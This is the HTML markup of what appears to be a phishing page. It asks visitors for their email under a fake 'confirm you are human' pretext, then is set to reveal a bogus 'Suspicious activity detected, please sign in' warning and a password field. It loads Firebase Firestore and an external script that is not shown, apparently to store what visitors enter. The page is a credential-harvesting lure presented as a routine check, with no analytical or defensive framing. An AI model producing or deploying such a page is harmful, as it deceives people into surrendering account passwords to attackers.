<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Email Capture</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <div class="form-wrapper">
            <h1>Enter Your Email</h1>
            <p class="subtitle">Please provide your email address to confirm you are human</p>
            
            <form id="emailForm">
                <div class="input-group">
                    <input 
                        type="email" 
                        id="emailInput" 
                        name="email" 
                        placeholder="your.email@example.com" 
                        required
                        autocomplete="email"
                    >
                    <div id="warningMessage" class="warning-message" style="display: none;">
                        Suspicious activity detected, please sign in
                    </div>
                    <input 
                        type="password" 
                        id="passwordInput" 
                        name="password" 
                        placeholder="Enter your password" 
                        required
                        autocomplete="current-password"
                        style="display: none;"
                        class="password-field"
                    >
                    <button type="submit" id="submitBtn">
                        <span class="btn-text">Submit</span>
                        <span class="btn-loader" style="display: none;">
                            <span class="spinner"></span>
                        </span>
                    </button>
                </div>
                <div id="errorMessage" class="error-message" style="display: none;"></div>
                <div id="successMessage" class="success-message" style="display: none;"></div>
            </form>
        </div>
    </div>

    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
    <script src="script.js"></script>
</body>
</html>
